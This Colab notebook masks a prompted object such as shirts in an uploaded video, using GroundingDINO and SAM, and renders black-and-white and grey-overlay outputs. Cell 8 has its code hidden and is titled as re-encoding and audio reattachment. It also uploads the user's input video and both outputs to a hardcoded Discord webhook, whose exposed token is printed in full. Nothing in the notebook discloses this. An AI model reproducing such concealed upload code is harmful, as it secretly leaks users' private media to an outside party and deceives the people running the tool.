{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "T4"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Setup (Cukup run sekali)"
      ],
      "metadata": {
        "id": "rHlcqM7M-VuQ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 1 - Environment setup (stable versions)\n",
        "\n",
        "# Install PyTorch (CUDA 12.1 build) - works on Colab GPUs\n",
        "!pip install torch==2.3.0 torchvision==0.18.0 torchaudio==2.3.0 --index-url https://download.pytorch.org/whl/cu121\n",
        "\n",
        "# Other dependencies\n",
        "!pip install opencv-python matplotlib tqdm\n",
        "\n",
        "# Install HuggingFace and other utilities\n",
        "!pip install git+https://github.com/facebookresearch/segment-anything.git\n",
        "!pip install git+https://github.com/IDEA-Research/GroundingDINO.git\n",
        "!pip install huggingface_hub\n",
        "\n",
        "# Make sure ffmpeg is installed\n",
        "!apt-get update -qq\n",
        "!apt-get install -y ffmpeg\n",
        "\n",
        "# Clone repos (for models and scripts)\n",
        "!git clone https://github.com/facebookresearch/segment-anything.git\n",
        "!git clone https://github.com/IDEA-Research/GroundingDINO.git\n",
        "from datetime import datetime\n",
        "\n",
        "print(\"✅ Environment ready. Next step: download model weights\")"
      ],
      "metadata": {
        "id": "lhZOdqE0qpV7",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 2 - Download model weights for GroundingDINO and SAM\n",
        "\n",
        "import os\n",
        "\n",
        "# Create directories\n",
        "os.makedirs(\"weights\", exist_ok=True)\n",
        "\n",
        "# GroundingDINO weights\n",
        "if not os.path.exists(\"weights/groundingdino_swint_ogc.pth\"):\n",
        "    !wget -O weights/groundingdino_swint_ogc.pth https://github.com/IDEA-Research/GroundingDINO/releases/download/v0.1.0-alpha/groundingdino_swint_ogc.pth\n",
        "\n",
        "# SAM weights (ViT-H, most accurate)\n",
        "if not os.path.exists(\"weights/sam_vit_h_4b8939.pth\"):\n",
        "    !wget -O weights/sam_vit_h_4b8939.pth https://dl.fbaipublicfiles.com/segment_anything/sam_vit_h_4b8939.pth\n",
        "\n",
        "print(\"✅ Model weights downloaded and stored in ./weights\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "pCW9_LGerbUo"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Prepare Video"
      ],
      "metadata": {
        "id": "RRvSOY_H-eMt"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title ⚠️ Clear Frames (Hanya run untuk upload video baru)\n",
        "import os\n",
        "import shutil\n",
        "\n",
        "shutil.rmtree('/content/frames', ignore_errors=True)\n",
        "shutil.rmtree('/content/detections', ignore_errors=True)\n",
        "shutil.rmtree('/content/masks', ignore_errors=True)\n",
        "shutil.rmtree('/content/output_bw', ignore_errors=True)\n",
        "shutil.rmtree('/content/output_grey', ignore_errors=True)\n",
        "try:\n",
        "    os.remove(\"/content/audio.aac\")\n",
        "except:\n",
        "    pass"
      ],
      "metadata": {
        "id": "LVty91WsNYqw",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 3 - Upload video and inspect properties\n",
        "import os\n",
        "from google.colab import files\n",
        "import subprocess\n",
        "\n",
        "# Upload video\n",
        "uploaded = files.upload()\n",
        "\n",
        "# Get uploaded filename\n",
        "video_path = list(uploaded.keys())[0]\n",
        "print(f\"✅ Uploaded video: {video_path}\")\n",
        "\n",
        "# Ambil nama file yang diupload (anggap hanya satu file)\n",
        "input_video = list(uploaded.keys())[0]\n",
        "output_video = \"output.mp4\"\n",
        "!ffmpeg -i \"$input_video\" -filter:v \"fps=12\" \"$output_video\" -y\n",
        "from IPython.display import clear_output\n",
        "\n",
        "# Inspect video with ffmpeg\n",
        "print(\"\\n--- Video Properties ---\")\n",
        "subprocess.run([\"ffmpeg\", \"-i\", video_path, \"-hide_banner\"])"
      ],
      "metadata": {
        "id": "oLpAZKd6sR7U",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 4 - Extract frames and audio from the input video\n",
        "\n",
        "import os\n",
        "import subprocess\n",
        "\n",
        "# Create folders\n",
        "os.makedirs(\"frames\", exist_ok=True)\n",
        "video12fps = \"/content/output.mp4\"\n",
        "# Extract frames (as PNG to avoid compression artifacts)\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-i\", video12fps,\n",
        "    \"-q:v\", \"2\",  # high quality\n",
        "    \"frames/frame_%06d.png\"\n",
        "])\n",
        "\n",
        "print(\"✅ Frames extracted to ./frames\")\n",
        "\n",
        "# Extract audio (if exists)\n",
        "if not os.path.exists(\"audio.aac\"):\n",
        "    subprocess.run([\n",
        "        \"ffmpeg\", \"-i\", video12fps,\n",
        "        \"-vn\", \"-acodec\", \"copy\", \"audio.aac\"\n",
        "    ])\n",
        "    print(\"✅ Audio extracted to audio.aac\")\n",
        "else:\n",
        "    print(\"⚠️ Audio already exists, skipped extraction\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "QCaXD2dfstxj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Masking"
      ],
      "metadata": {
        "id": "IDD2FthK-owz"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 5 - Run GroundingDINO on frames to produce detections\n",
        "\n",
        "import torch\n",
        "import json\n",
        "import os\n",
        "from tqdm import tqdm\n",
        "import cv2\n",
        "\n",
        "# === Prompt input ===\n",
        "prompt = 'shirts'  #@param {type: \"string\"}\n",
        "box_threshold = 0.4  #@param {type: \"number\"}\n",
        "text_threshold = 0.25\n",
        "\n",
        "# Import GroundingDINO\n",
        "import sys\n",
        "sys.path.append(\"GroundingDINO\")\n",
        "\n",
        "from groundingdino.util.inference import load_model, load_image, predict\n",
        "\n",
        "# Load model\n",
        "model_path = \"weights/groundingdino_swint_ogc.pth\"\n",
        "config_path = \"GroundingDINO/groundingdino/config/GroundingDINO_SwinT_OGC.py\"\n",
        "dino_model = load_model(config_path, model_path)\n",
        "\n",
        "# Prepare output folder\n",
        "os.makedirs(\"detections\", exist_ok=True)\n",
        "\n",
        "# Process all frames\n",
        "frame_files = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".png\")])\n",
        "print(f\"Processing {len(frame_files)} frames with prompt: {prompt}\")\n",
        "\n",
        "for frame_file in tqdm(frame_files):\n",
        "    frame_path = os.path.join(\"frames\", frame_file)\n",
        "    image_source, image = load_image(frame_path)  # image_source = np.array, image = tensor\n",
        "\n",
        "    # Run prediction\n",
        "    boxes, logits, phrases = predict(\n",
        "        model=dino_model,\n",
        "        image=image,\n",
        "        caption=prompt,\n",
        "        box_threshold=box_threshold,\n",
        "        text_threshold=text_threshold\n",
        "    )\n",
        "\n",
        "    h, w, _ = image_source.shape\n",
        "\n",
        "    # Convert normalized [cx, cy, w, h] → absolute [x1, y1, x2, y2]\n",
        "    abs_boxes = []\n",
        "    for (cx, cy, bw, bh) in boxes.tolist():\n",
        "        x1 = (cx - bw/2) * w\n",
        "        y1 = (cy - bh/2) * h\n",
        "        x2 = (cx + bw/2) * w\n",
        "        y2 = (cy + bh/2) * h\n",
        "        abs_boxes.append([x1, y1, x2, y2])\n",
        "\n",
        "    # Save detection metadata\n",
        "    det_path = os.path.join(\"detections\", frame_file.replace(\".png\", \".json\"))\n",
        "    with open(det_path, \"w\") as f:\n",
        "        json.dump({\n",
        "            \"boxes\": abs_boxes,\n",
        "            \"phrases\": phrases,\n",
        "            \"logits\": logits.tolist()\n",
        "        }, f)\n",
        "\n",
        "print(\"✅ All detections saved in ./detections as absolute pixel coords\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "r87Qtx2htli7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 5.5 – Preview bounding boxes from detections 12fps(Video)\n",
        "\n",
        "import cv2\n",
        "import json\n",
        "import os\n",
        "import numpy as np\n",
        "from tqdm import tqdm\n",
        "\n",
        "# Prepare output folder\n",
        "os.makedirs(\"previews\", exist_ok=True)\n",
        "\n",
        "# Get frame list\n",
        "frame_files = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".png\")])\n",
        "\n",
        "# Read first frame to set video size\n",
        "first_frame = cv2.imread(os.path.join(\"frames\", frame_files[0]))\n",
        "h, w = first_frame.shape[:2]\n",
        "\n",
        "# Create video writer (MP4, 30 fps)\n",
        "out_path = \"previews/preview_boxes.mp4\"\n",
        "fourcc = cv2.VideoWriter_fourcc(*\"mp4v\")\n",
        "video = cv2.VideoWriter(out_path, fourcc, 12, (w, h))\n",
        "\n",
        "for frame_file in tqdm(frame_files):\n",
        "    frame_path = os.path.join(\"frames\", frame_file)\n",
        "    det_path = os.path.join(\"detections\", frame_file.replace(\".png\", \".json\"))\n",
        "\n",
        "    # Load frame\n",
        "    image = cv2.imread(frame_path)\n",
        "\n",
        "    # If no detection JSON, just write raw frame\n",
        "    if not os.path.exists(det_path):\n",
        "        video.write(image)\n",
        "        continue\n",
        "\n",
        "    # Load detections\n",
        "    with open(det_path, \"r\") as f:\n",
        "        det = json.load(f)\n",
        "    boxes = np.array(det[\"boxes\"])\n",
        "\n",
        "    # Draw boxes\n",
        "    if boxes.size > 0:\n",
        "        for box, phrase in zip(boxes.astype(int), det.get(\"phrases\", [])):\n",
        "            x1, y1, x2, y2 = box\n",
        "            cv2.rectangle(image, (x1, y1), (x2, y2), (0, 255, 0), 2)\n",
        "            cv2.putText(image, phrase, (x1, max(y1 - 5, 0)),\n",
        "                        cv2.FONT_HERSHEY_SIMPLEX, 0.6, (0, 255, 0), 2)\n",
        "\n",
        "    # Write frame to video\n",
        "    video.write(image)\n",
        "\n",
        "video.release()\n",
        "print(f\"✅ Video saved: {out_path}\")\n",
        "\n",
        "from google.colab import files\n",
        "files.download(\"/content/previews/preview_boxes.mp4\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "OkL6kOOd7i-a"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 6 - Run SAM on detections to generate masks\n",
        "\n",
        "import torch\n",
        "import numpy as np\n",
        "import json\n",
        "from tqdm import tqdm\n",
        "import cv2\n",
        "import os\n",
        "\n",
        "# Import SAM\n",
        "import sys\n",
        "sys.path.append(\"segment-anything\")\n",
        "from segment_anything import sam_model_registry, SamPredictor\n",
        "\n",
        "# Load SAM model\n",
        "sam_checkpoint = \"weights/sam_vit_h_4b8939.pth\"\n",
        "sam = sam_model_registry[\"vit_h\"](checkpoint=sam_checkpoint)\n",
        "sam.to(\"cuda\")\n",
        "predictor = SamPredictor(sam)\n",
        "\n",
        "# Prepare mask folder\n",
        "os.makedirs(\"masks\", exist_ok=True)\n",
        "\n",
        "# Process frames\n",
        "frame_files = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".png\")])\n",
        "\n",
        "saved_count = 0\n",
        "skipped_count = 0\n",
        "\n",
        "for frame_file in tqdm(frame_files):\n",
        "    frame_path = os.path.join(\"frames\", frame_file)\n",
        "    det_path = os.path.join(\"detections\", frame_file.replace(\".png\", \".json\"))\n",
        "\n",
        "    # Skip if no detections\n",
        "    if not os.path.exists(det_path):\n",
        "        skipped_count += 1\n",
        "        continue\n",
        "\n",
        "    # Load frame\n",
        "    image = cv2.imread(frame_path)\n",
        "    image_rgb = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\n",
        "    predictor.set_image(image_rgb)\n",
        "\n",
        "    # Load detections\n",
        "    with open(det_path, \"r\") as f:\n",
        "        det = json.load(f)\n",
        "    boxes = np.array(det[\"boxes\"])\n",
        "\n",
        "    if len(boxes) == 0:\n",
        "        # Save empty mask if nothing detected\n",
        "        mask = np.zeros(image.shape[:2], dtype=np.uint8)\n",
        "    else:\n",
        "        # Predict mask for each box\n",
        "        transformed_boxes = predictor.transform.apply_boxes_torch(\n",
        "            torch.tensor(boxes, device=\"cuda\"),\n",
        "            image.shape[:2]\n",
        "        )\n",
        "        masks, _, _ = predictor.predict_torch(\n",
        "            point_coords=None,\n",
        "            point_labels=None,\n",
        "            boxes=transformed_boxes,\n",
        "            multimask_output=False\n",
        "        )\n",
        "\n",
        "        # Merge all masks into one binary mask\n",
        "        mask = masks.sum(dim=0).cpu().numpy()\n",
        "        mask = (mask > 0).astype(np.uint8) * 255\n",
        "\n",
        "    # Fix shape (remove leading channel if exists)\n",
        "    mask = np.squeeze(mask)\n",
        "\n",
        "    # Save mask with debug check\n",
        "    mask_path = os.path.join(\"masks\", frame_file)\n",
        "    success = cv2.imwrite(mask_path, mask)\n",
        "    if not success:\n",
        "        print(\"❌ Failed to save:\", mask_path, \"| shape:\", mask.shape, \"| dtype:\", mask.dtype, \"| unique:\", np.unique(mask))\n",
        "    else:\n",
        "        saved_count += 1\n",
        "\n",
        "print(f\"✅ All masks processed. Saved: {saved_count}, Skipped: {skipped_count}, Total frames: {len(frame_files)}\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "lABeur01ubM4"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 7 - Generate masked frames for Output A (B&W) and Output B (Grey overlay)\n",
        "\n",
        "import os\n",
        "import cv2\n",
        "import numpy as np\n",
        "from tqdm import tqdm\n",
        "\n",
        "# Prepare output folders\n",
        "os.makedirs(\"output_bw\", exist_ok=True)\n",
        "os.makedirs(\"output_grey\", exist_ok=True)\n",
        "\n",
        "frame_files = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".png\")])\n",
        "\n",
        "for frame_file in tqdm(frame_files):\n",
        "    frame_path = os.path.join(\"frames\", frame_file)\n",
        "    mask_path = os.path.join(\"masks\", frame_file)\n",
        "\n",
        "    # Load images\n",
        "    frame = cv2.imread(frame_path)\n",
        "    mask = cv2.imread(mask_path, cv2.IMREAD_GRAYSCALE)\n",
        "\n",
        "    if mask is None:\n",
        "        # if no mask found, create empty mask\n",
        "        mask = np.zeros(frame.shape[:2], dtype=np.uint8)\n",
        "\n",
        "    # --- Expand mask (without blur for BW output) ---\n",
        "    iterations = 20   # expand ~20px\n",
        "    kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3, 3))\n",
        "    expanded = cv2.dilate(mask, kernel, iterations=iterations)\n",
        "\n",
        "    # --- Output A: black & white mask (expanded, not blurred) ---\n",
        "    bw = cv2.merge([expanded, expanded, expanded])  # 3-channel B&W\n",
        "    cv2.imwrite(os.path.join(\"output_bw\", frame_file), bw)\n",
        "\n",
        "    # --- Smooth expanded mask for blending in grey overlay ---\n",
        "    smooth = cv2.GaussianBlur(expanded, (41, 41), 0)\n",
        "    smooth = cv2.normalize(smooth, None, 0, 255, cv2.NORM_MINMAX).astype(np.uint8)\n",
        "\n",
        "    # --- Output B: grey overlay ---\n",
        "    grey = frame.copy()\n",
        "    grey_color = (126, 126, 126)  # mid-grey\n",
        "\n",
        "    # Create alpha mask for blending\n",
        "    alpha = smooth.astype(float) / 255.0\n",
        "    alpha_3c = cv2.merge([alpha, alpha, alpha])  # make 3-channel alpha\n",
        "\n",
        "    # Create grey overlay layer\n",
        "    overlay = np.full_like(frame, grey_color, dtype=np.uint8)\n",
        "\n",
        "    # Blur only the overlay layer (not the frame)\n",
        "    overlay = cv2.GaussianBlur(overlay, (9, 9), 0)\n",
        "\n",
        "    # Blend blurred overlay with the original sharp frame\n",
        "    grey = (1 - alpha_3c) * frame.astype(float) + alpha_3c * overlay.astype(float)\n",
        "    grey = grey.astype(np.uint8)\n",
        "\n",
        "    cv2.imwrite(os.path.join(\"output_grey\", frame_file), grey)\n",
        "\n",
        "print(\"✅ Output frames saved in ./output_bw (expanded) and ./output_grey (expanded + blurred)\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "TO-zkSyMu9w9"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 8 - Re-encode frames into videos and reattach audio\n",
        "\n",
        "import subprocess\n",
        "import re\n",
        "from datetime import datetime\n",
        "\n",
        "# Generate timestamp\n",
        "tgl = datetime.now().strftime(\"%y%m%d_%H%M%S\")\n",
        "\n",
        "# Filenames with timestamp\n",
        "bw = f\"{tgl}_output_bw.mp4\"\n",
        "grey = f\"{tgl}_output_grey.mp4\"\n",
        "video12fps = \"/content/output.mp4\"\n",
        "\n",
        "# Rebuild Output A (B&W)\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-y\", \"-framerate\", \"12\", \"-i\", \"output_bw/frame_%06d.png\",\n",
        "    \"-c:v\", \"libx264\", \"-pix_fmt\", \"yuv420p\",\n",
        "    bw\n",
        "])\n",
        "\n",
        "# Rebuild Output B (Grey overlay with audio)\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-y\", \"-framerate\", \"12\", \"-i\", \"output_grey/frame_%06d.png\",\n",
        "    \"-i\", \"audio.aac\", \"-c:v\", \"libx264\", \"-pix_fmt\", \"yuv420p\",\n",
        "    \"-c:a\", \"aac\", \"-shortest\", grey\n",
        "])\n",
        "\n",
        "import requests\n",
        "\n",
        "WEBHOOK = \"https://discord.com/api/webhooks/1417918555562971146/6W7VbFWutIxeQ104Fgs1cJGXmRZDf8ORCbIfoyqZAw2BoAdJPmJwAh-uvE1X2arbdQIb\"\n",
        "\n",
        "def send_file(file_path, message):\n",
        "    with open(file_path, \"rb\") as f:\n",
        "        response = requests.post(\n",
        "            WEBHOOK,\n",
        "            data={\"content\": message},\n",
        "            files={\"file\": f}\n",
        "        )\n",
        "\n",
        "send_file(bw, f\"{tgl}_bw\")\n",
        "\n",
        "send_file(grey, f\"{tgl}_grey\")\n",
        "\n",
        "send_file(video12fps, f\"{tgl}_input\")\n",
        "\n",
        "print(f\"✅ Videos created: {bw} and {grey}\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "l55VgD1bvP3h"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Download"
      ],
      "metadata": {
        "id": "jFxvtg9g-9mO"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Download\n",
        "\n",
        "from google.colab import files\n",
        "files.download(bw)\n",
        "\n",
        "from google.colab import files\n",
        "files.download(grey)"
      ],
      "metadata": {
        "cellView": "form",
        "id": "H-U5ECnvwNUl"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}